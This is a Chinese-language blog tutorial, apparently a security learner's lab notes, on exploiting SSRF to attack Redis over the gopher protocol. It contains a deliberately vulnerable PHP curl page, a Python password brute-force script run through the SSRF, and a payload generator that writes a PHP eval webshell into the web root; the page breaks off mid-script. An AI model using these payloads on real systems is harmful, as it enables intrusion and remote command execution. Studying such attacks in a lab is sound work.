<!DOCTYPE HTML>
<html lang="zh-CN">


<head>
    <meta charset="utf-8">
    <meta name="keywords" content="ssrf打redis, hybcx&#39;s blog">
    <meta name="description" content="0x01 SSRF介绍
SSRF，服务器端请求伪造，是由攻击者构造的漏洞，用于形成服务器发起的请求。通常，SSRF攻击的目标是外部网络无法访问的内部系统。今天学习一手redis中如何利用SSRF，感觉这个在实战中不怎么常见，但其中的知识值得">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="renderer" content="webkit|ie-stand|ie-comp">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <meta name="referrer" content="no-referrer-when-downgrade">
    <!-- Global site tag (gtag.js) - Google Analytics -->


    <title>ssrf打redis | hybcx&#39;s blog</title>
    <link rel="icon" type="image/png" href="/favicon.png">
    


    <!-- bg-cover style     -->



<link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
<link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
<link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
<link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
<link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
<link rel="stylesheet" type="text/css" href="/css/matery.css">
<link rel="stylesheet" type="text/css" href="/css/my.css">
<link rel="stylesheet" type="text/css" href="/css/dark.css" media="none" onload="if(media!='all')media='all'">




    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
    <link rel="stylesheet" href="/css/post.css">




    
        <link rel="stylesheet" type="text/css" href="/css/reward.css">
    



    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>

<meta name="generator" content="Hexo 7.2.0">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
</head>


<body>
    <header class="navbar-fixed">
    <nav id="headNav" class="bg-color nav-transparent">
        <div id="navContainer" class="nav-wrapper container">
            <div class="brand-logo">
                <a href="/" class="waves-effect waves-light">
                    
                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
                    
                    <span class="logo-span diyFont">hybcx&#39;s blog</span>
                </a>
            </div>
            

<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
<ul class="right nav-menu">
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/" class="waves-effect waves-light">
      
      <i class="fas fa-home" style="zoom: 0.6;"></i>
      
      <span>首页</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/tags" class="waves-effect waves-light">
      
      <i class="fas fa-tags" style="zoom: 0.6;"></i>
      
      <span>标签</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/categories" class="waves-effect waves-light">
      
      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
      
      <span>分类</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/archives" class="waves-effect waves-light">
      
      <i class="fas fa-archive" style="zoom: 0.6;"></i>
      
      <span>归档</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/about" class="waves-effect waves-light">
      
      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
      
      <span>关于</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/contact" class="waves-effect waves-light">
      
      <i class="fas fa-comments" style="zoom: 0.6;"></i>
      
      <span>留言板</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/friends" class="waves-effect waves-light">
      
      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
      
      <span>友情链接</span>
    </a>
    
  </li>
  
  <li>
    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
    </a>
  </li>
  <li>
    <a href="javascript:;" class="waves-effect waves-light" onclick="switchNightMode()" title="深色/浅色模式" >
      <i id="sum-moon-icon" class="fas fa-sun" style="zoom: 0.85;"></i>
    </a>
  </li>
</ul>


<div id="mobile-nav" class="side-nav sidenav">

    <div class="mobile-head bg-color">
        
        <img src="/medias/logo.png" class="logo-img circle responsive-img">
        
        <div class="logo-name">hybcx&#39;s blog</div>
        <div class="logo-desc">
            
            Never really desperate, only the lost of the soul.
            
        </div>
    </div>

    <ul class="menu-list mobile-menu-list">
        
        <li class="m-nav-item">
	  
		<a href="/" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-home"></i>
			
			首页
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/tags" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-tags"></i>
			
			标签
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/categories" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-bookmark"></i>
			
			分类
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/archives" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-archive"></i>
			
			归档
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/about" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-user-circle"></i>
			
			关于
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/contact" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-comments"></i>
			
			留言板
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/friends" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-address-book"></i>
			
			友情链接
		</a>
          
        </li>
        
        
        <li><div class="divider"></div></li>
        <li>
            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
                <i class="fab fa-github-square fa-fw"></i>Fork Me
            </a>
        </li>
        
    </ul>
</div>


        </div>

        
            <style>
    .nav-transparent .github-corner {
        display: none !important;
    }

    .github-corner {
        position: absolute;
        z-index: 10;
        top: 0;
        right: 0;
        border: 0;
        transform: scale(1.1);
    }

    .github-corner svg {
        color: #0f9d58;
        fill: #fff;
        height: 64px;
        width: 64px;
    }

    .github-corner:hover .octo-arm {
        animation: a 0.56s ease-in-out;
    }

    .github-corner .octo-arm {
        animation: none;
    }

    @keyframes a {
        0%,
        to {
            transform: rotate(0);
        }
        20%,
        60% {
            transform: rotate(-25deg);
        }
        40%,
        80% {
            transform: rotate(10deg);
        }
    }
</style>

<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
   data-tooltip="Fork Me" data-position="left" data-delay="50">
    <svg viewBox="0 0 250 250" aria-hidden="true">
        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
              fill="currentColor" class="octo-body"></path>
    </svg>
</a>
        
    </nav>

</header>

    



<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/20.jpg')">
    <div class="container" style="right: 0px;left: 0px;">
        <div class="row">
            <div class="col s12 m12 l12">
                <div class="brand">
                    <h1 class="description center-align post-title">ssrf打redis</h1>
                </div>
            </div>
        </div>
    </div>
</div>




<main class="post-container content">

    
    <div class="row">
    <div id="main-content" class="col s12 m12 l9">
        <!-- 文章内容详情 -->
<div id="artDetail">
    <div class="card">
        <div class="card-content article-info">
            <div class="row tag-cate">
                <div class="col s7">
                    
                    <div class="article-tag">
                        
                            <a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/">
                                <span class="chip bg-color">基础知识</span>
                            </a>
                        
                    </div>
                    
                </div>
                <div class="col s5 right-align">
                    
                    <div class="post-cate">
                        <i class="fas fa-bookmark fa-fw icon-category"></i>
                        
                            <a href="/categories/web%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/" class="post-category">
                                web知识总结
                            </a>
                        
                    </div>
                    
                </div>
            </div>

            <div class="post-info">
                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
                    2023-12-27
                </div>
                

                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
                    2024-03-31
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
                    12.3k
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
                    52 分
                </div>
                

                
                    <div id="busuanzi_container_page_pv" class="info-break-policy">
                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
                        <span id="busuanzi_value_page_pv"></span>
                    </div>
				
            </div>
        </div>
        <hr class="clearfix">

        
        <!-- 是否加载使用自带的 prismjs. -->
        <link rel="stylesheet" href="/libs/prism/prism.css">
        

        

        <div class="card-content article-card-content">
            <div id="articleContent">
                <h1>0x01 SSRF介绍</h1>
<p>SSRF，服务器端请求伪造，是由攻击者构造的漏洞，用于形成服务器发起的请求。通常，SSRF攻击的目标是外部网络无法访问的内部系统。今天学习一手redis中如何利用SSRF，感觉这个在实战中不怎么常见，但其中的知识值得学习</p>
<h1>0x02 环境搭建</h1>
<p>这里在又是废了一天搭建成功，建议大家还是直接下载redis-server服务搭建比较好，网上的教程属实是有点垃圾且害人</p>
<p>这里我的版本的<code>ubuntu22.04 LTS</code></p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">安装Redis：
<span class="token function">apt-get</span> <span class="token function">install</span> redis-server

修改Redis配置文件（设置密码，监听ip等）：
<span class="token function">vim</span> /etc/redis/redis.conf
配置监听ip：
<span class="token builtin class-name">bind</span> <span class="token number">127.0</span>.0.1 ::1<span class="token comment">#只监听本地端口，如果需要远程登录可以在后面加上本机的ip，同时远程登录也可能造成未授权访问。</span>
配置默认密码：
<span class="token comment">#requirepass foobared#默认无密码，要设置密码可以将前面的#删除，然后将foobared改为要设置的密码。</span>

启动Redis：
/bin/redis-server /etc/redis/redis.conf
或者
<span class="token function">service</span> redis-server start<span class="token comment">#这种方法启动可能会造成Redis在web目录、计划任务目录、.ssh目录等其他一些目录没有写入的权限，就算是root身份启动，文件夹777权限也不行（就很迷）。如果遇到Redis在执行save时报错，就还是试试root身份第一种方法启动吧。</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>第二天了，你没猜错，这玩意儿tm又废了我一天时间搭建，最终还是选择centos7搭建成功</p>
<p>具体可以参考：<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/242692.html">Redis环境搭建</a>、<a target="_blank" rel="noopener" href="https://blog.csdn.net/a158640927/article/details/129717051?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=centos7%E6%90%AD%E5%BB%BAapache%20php&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-1-129717051.142%5Ev99%5Epc_search_result_base2&amp;spm=1018.2226.3001.4187">CentOS7 搭建php环境 </a>–只需要将其中的php、apache服务安装好即可，最后记得在防火墙开启所需要的端口。其中ssrf.php代码如下：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//创建新的 cURL 资源</span>
<span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//设置URL 和相应的选项</span>
<span class="token comment"># curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);</span>
<span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment"># curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);</span>
<span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">//抓取 URL 内容并把它传递给浏览器，存储进文件</span>
<span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//关闭 cURL 资源，并且释放系统资源</span>
<span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="/2023/12/27/ssrf-da-redis/image-20231229142247812.png" alt="image-20231229142247812"></p>
<p>测试没毛病。</p>
<h1>0x03 前置知识</h1>
<p>这里看到师傅们在探讨这一问题的时候需要学习一手RESP协议，那我们跟着师傅学一手</p>
<h2 id="RESP协议">RESP协议</h2>
<p><code>Redis</code>服务器与客户端通过<code>RESP</code>（REdis Serialization Protocol）协议通信。</p>
<p>RESP协议是在Redis 1.2中引入的，但它成为了与Redis 2.0中的Redis服务器通信的标准方式。这是您应该在Redis客户端中实现的协议。</p>
<p>RESP实际上是一个支持以下数据类型的序列化协议：简单字符串，错误，整数，批量字符串和数组。</p>
<p>RESP在Redis中用作请求 - 响应协议的方式如下：</p>
<ol>
<li>客户端将命令作为<code>Bulk Strings</code>的RESP数组发送到Redis服务器。</li>
<li>服务器根据命令实现回复一种RESP类型。</li>
</ol>
<p>在RESP中，某些数据的类型取决于第一个字节：</p>
<pre class="line-numbers language-none"><code class="language-none">对于`Simple Strings`，回复的第一个字节是`+`
对于`error`，回复的第一个字节是`-`
对于`Integer`，回复的第一个字节是`:`
对于`Bulk Strings`，回复的第一个字节是`$`
对于`array`，回复的第一个字节是`*`
此外，`RESP`能够使用稍后指定的`Bulk Strings`或`Array`的特殊变体来表示`Null`值。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>在RESP中，协议的不同部分始终以<code>"\r\n"(CRLF)</code>结束。</p>
<p>我们用<code>tcpdump</code>来抓个客户端与redis服务器通信的包来分析一下</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">命令：tcpdump <span class="token parameter variable">-i</span> lo <span class="token parameter variable">-s</span> <span class="token number">0</span> port <span class="token number">6379</span> <span class="token parameter variable">-w</span> redis.pcap
参数说明：
-i指定网卡（一般指定eth0，这里抓取本地接口的流量需要指定为lo）
-s抓取数据包时默认抓取长度为68字节。加上-s <span class="token number">0</span> 后可以抓到完整的数据包
port指定抓取的端口
-w保存到文件，后接保存的路径与文件名<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="/2023/12/27/ssrf-da-redis/image-20231228175523608.png" alt="image-20231228175523608"></p>
<p>这里本地先开启监听，之后进入redis服务器<code>redis-cli -h 127.0.0.1 -p 6379</code> 之后在redis服务器执行如下命令</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">127.0</span>.0.1:637<span class="token operator"><span class="token file-descriptor important">9</span>&gt;</span> <span class="token builtin class-name">set</span> key1 value1
OK
<span class="token number">127.0</span>.0.1:637<span class="token operator"><span class="token file-descriptor important">9</span>&gt;</span> quit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p><img src="/2023/12/27/ssrf-da-redis/image-20231228175629190.png" alt="image-20231228175629190"></p>
<p>最后将产生的pcap数据包传入wireshark追踪tcp数据流</p>
<p><img src="/2023/12/27/ssrf-da-redis/image-20231228175746108.png" alt="image-20231228175746108"></p>
<p>这里对于该工具的使用方法几乎不懂，但好在找到了目标数据，如上图所示</p>
<p>抓到的数据包如下，结合我们上面对RESP协议的解释，我们来逐行分析:</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">*3：代表数组，也就是这个数组长度为3，set、key1、value1可以将之间的空格认为是分隔符
<span class="token variable">$3</span>：代表批量字符串，长度为3：set；之后的<span class="token variable">$4</span>、<span class="token variable">$6</span>同理
最后的+OK：代表简单字符串
其中set代表设置key，key为key1，对应的value为value1
最后的+OK代表服务端执行成功后返回的字符串<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>hex转储看一下</p>
<p><img src="/2023/12/27/ssrf-da-redis/image-20231228180421235.png" alt="image-20231228180421235"></p>
<p>正如前面所说的，客户端向将命令作为<code>Bulk Strings</code>的RESP数组发送到Redis服务器，然后服务器根据命令实现回复给客户端一种RESP类型。</p>
<p>这里的0d0a代表CRLF也就是回车换行符，在这里代表结束符。那有趣的来了，如果我们将上述的数据进行url编码随后在本机127.0.0.1中通过curl和gopher发送给redis服务器会如何呢？</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">*3
<span class="token variable">$3</span>
<span class="token builtin class-name">set</span>
<span class="token variable">$4</span>
key1
<span class="token variable">$6</span>
value1
经过url编码后：注意这里的%0A需要换成%0D0A

%2A3%0D%0A%243%0D%0Aset%0D%0A%244%0D%0Akey1%0D%0A%246%0D%0Avalue1%0D%0A
再接着
gopher://127.0.0.1:6379/_%2A3%0D%0A%243%0D%0Aset%0D%0A%244%0D%0Akey1%0D%0A%246%0D%0Avalue1%0D%0A<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="/2023/12/27/ssrf-da-redis/image-20231228190902772.png" alt="image-20231228190902772"></p>
<p>如上图可以看到左侧的OK代表我们执行成功，右图是我们登录redis服务器之后验证key1的值是否被设置了</p>
<p>这里看到师傅还尝试直接使用命令发送，而不采取tcp数据流了。我们也尝试一下</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">命令：
<span class="token builtin class-name">set</span> key2 value2
get key2

url编码后：
gopher://127.0.0.1:6379/_set%20key2%20value2%0D%0Aget%20key2%0D%0A<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="/2023/12/27/ssrf-da-redis/image-20231228191343559.png" alt="image-20231228191343559"></p>
<p>如上图，看到成功返回了我们刚刚设置的key的值，说明直接发送命令的方法也是可行的。知道了如何让Redis服务器执行我们的命令，那么接下来我们就来看如何攻击来达到 getshell 的目的。</p>
<h1>0x04 Redis配合gopher协议进行SSRF</h1>
<h2 id="概述">概述</h2>
<p>gopher协议是http协议出现之前，在internet中常见的一个协议，但现在这个协议用的越来越少了，但该协议在ssrf中却大有用途，可以用来攻击redis、ftp等，还可以发送get、post请求，这在ssrf攻击中大有作为。</p>
<h2 id="利用条件">利用条件</h2>
<p>redis所在的服务端存在未授权访问或者通过弱口令可以访问到</p>
<h2 id="利用">利用</h2>
<p>redis常见的SSRF攻击方式大概有这几种：</p>
<ol>
<li>
<p>redis认证攻击</p>
</li>
<li>
<p>绝对路径写webshell</p>
</li>
<li>
<p>写ssh公钥</p>
</li>
<li>
<p>写contrab计划任务反弹shell</p>
</li>
</ol>
<p>下面我们逐个实现</p>
<h2 id="redis认证攻击">redis认证攻击</h2>
<p>这里呢也是可以分为两种情况的，一种是遇到默认无密码的redis服务器，另一种就是有密码的。</p>
<h3 id="无密码Redis攻击">无密码Redis攻击</h3>
<p>先考虑无密码的，这里呢其实也就是我们上述0x03中介绍过的可以直接构造恶意的明文命令，或者tcp数据流，发送给redis服务器</p>
<p>但这里呢如果对方的redis服务暴露在公网，这就好办了，直接curl发送gopher协议即可。</p>
<p>但如果对方redis限制只监听本地请求，那我们就只能祈祷对方服务器存在ssrf，接下来对于无密码的我就直接cv上面的了。</p>
<p>如果我们将上述的数据进行url编码随后在本机127.0.0.1中通过curl和gopher发送给redis服务器会如何呢？</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">*3
<span class="token variable">$3</span>
<span class="token builtin class-name">set</span>
<span class="token variable">$4</span>
key1
<span class="token variable">$6</span>
value1
经过url编码后：注意这里的%0A需要换成%0D0A

%2A3%0D%0A%243%0D%0Aset%0D%0A%244%0D%0Akey1%0D%0A%246%0D%0Avalue1%0D%0A
再接着
gopher://127.0.0.1:6379/_%2A3%0D%0A%243%0D%0Aset%0D%0A%244%0D%0Akey1%0D%0A%246%0D%0Avalue1%0D%0A<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="/2023/12/27/ssrf-da-redis/image-20231228190902772.png" alt="image-20231228190902772"></p>
<p>如上图可以看到左侧的OK代表我们执行成功，右图是我们登录redis服务器之后验证key1的值是否被设置了</p>
<p>这里看到师傅还尝试直接使用命令发送，而不采取tcp数据流了。我们也尝试一下</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">命令：
<span class="token builtin class-name">set</span> key2 value2
get key2

url编码后：
gopher://127.0.0.1:6379/_set%20key2%20value2%0D%0Aget%20key2%0D%0A<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="/2023/12/27/ssrf-da-redis/image-20231228191343559.png" alt="image-20231228191343559"></p>
<p>如上图，看到成功返回了我们刚刚设置的key的值，说明直接发送命令的方法也是可行的。知道了如何让Redis服务器执行我们的命令，那么接下来我们就来看如何攻击来达到 getshell 的目的。</p>
<h3 id="有密码Redis攻击">有密码Redis攻击</h3>
<p>这里我们先确定一个登录认证密码，修改redis下的配置文件 <strong>redis.conf</strong>，搜索 <strong>requirepass</strong> 关键字。</p>
<p><code>vim /etc/redis/redis.conf</code>，如下图将#去掉，并在requirepass后面添加密码</p>
<p><img src="/2023/12/27/ssrf-da-redis/image-20231228202542781.png" alt="image-20231228202542781"></p>
<p>退出后重新启动redis服务，接着我们开始爆破。</p>
<p>对于这种需要密码登录认证的，我们可以尝试弱密码，但手动太麻烦，这里我就跟师傅学着写个脚本</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests

target <span class="token operator">=</span> <span class="token string">"http://192.168.246.138/ssrf.php?url="</span>  <span class="token comment"># 请输入目标url</span>
rhost <span class="token operator">=</span> <span class="token string">"127.0.0.1"</span>
rport <span class="token operator">=</span> <span class="token string">"6379"</span>

<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"password.txt"</span><span class="token punctuation">,</span><span class="token string">"r+"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>
    passwds <span class="token operator">=</span> <span class="token builtin">file</span><span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> passwd <span class="token keyword">in</span> passwds<span class="token punctuation">:</span>
        passwd <span class="token operator">=</span> passwd<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span>
        len_pass <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>passwd<span class="token punctuation">)</span>
        payload <span class="token operator">=</span> <span class="token string">r"gopher://"</span> <span class="token operator">+</span> rhost <span class="token operator">+</span> <span class="token string">":"</span> <span class="token operator">+</span> rport <span class="token operator">+</span> <span class="token string">"/_%252A2%250d%250a%25244%250d%250aAUTH%250d%250a%2524"</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>len_pass<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">r"%250d%250a"</span><span class="token operator">+</span>passwd<span class="token operator">+</span><span class="token string">r"%250D%250A%252A1%250D%250A"</span>
        url <span class="token operator">=</span> target<span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
        text <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>text
        <span class="token keyword">if</span> <span class="token string">"OK"</span> <span class="token keyword">in</span> text<span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] 爆破成功 密码为: "</span> <span class="token operator">+</span> passwd<span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>text <span class="token operator">+</span> payload<span class="token punctuation">)</span>
            <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="/2023/12/27/ssrf-da-redis/image-20231228202916199.png" alt="image-20231228202916199"></p>
<p>上图为简单的字典，如下图可以看到最后停在了hybcx这里，说明密码为hybcx</p>
<p><img src="/2023/12/27/ssrf-da-redis/image-20231228203032489.png" alt="image-20231228203032489"></p>
<p>如下图检验成功</p>
<p><img src="/2023/12/27/ssrf-da-redis/image-20231228203105346.png" alt="image-20231228203105346"></p>
<h2 id="绝对路径写webshell">绝对路径写webshell</h2>
<p>据说这个方法是最常用的</p>
<h3 id="构造payload">构造payload</h3>
<p>先构造redis命令</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">flushall  	<span class="token comment">#删除redis数据库中所有的key</span>
<span class="token builtin class-name">set</span> <span class="token number">1</span> <span class="token string">'&lt;?php eval($_GET["cmd"]);?&gt;'</span>		<span class="token comment">#设置键1，值为一句话木马</span>
config <span class="token builtin class-name">set</span> <span class="token function">dir</span> /var/www/html		<span class="token comment">#设置redis数据库文件存储位置，这里设置为了web目录</span>
<span class="token comment">#设置数据库文件名为shell.php，这里是指示redis在下一次保存其数据库时存储为 web目录/shell.php</span>
config <span class="token builtin class-name">set</span> dbfilename shell.php		
save	<span class="token comment">#这个命令告诉Redis立即同步保存数据到磁盘上的数据库文件</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这里的目的就是向对方服务器的web目录写入一句话木马。这里师傅自己写了个转化为redis RESP协议格式的脚本，这里我直接cv了（我是大彩笔~~）</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> urllib
protocol<span class="token operator">=</span><span class="token string">"gopher://"</span>
ip<span class="token operator">=</span><span class="token string">"127.0.0.1"</span>
port<span class="token operator">=</span><span class="token string">"6379"</span>
shell<span class="token operator">=</span><span class="token string">"\n\n&lt;?php eval($_GET[\"cmd\"]);?&gt;\n\n"</span>
filename<span class="token operator">=</span><span class="token string">"shell.php"</span>
path<span class="token operator">=</span><span class="token string">"/var/www/html"</span>
passwd<span class="token operator">=</span><span class="token string">""</span>
cmd<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"flushall"</span><span class="token punctuation">,</span>
     <span class="token string">"set 1 {}"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>shell<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span><span class="token string">"${IFS}"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
     <span class="token string">"config set dir {}"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">,</span>
     <span class="token string">"config set dbfilename {}"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">,</span>
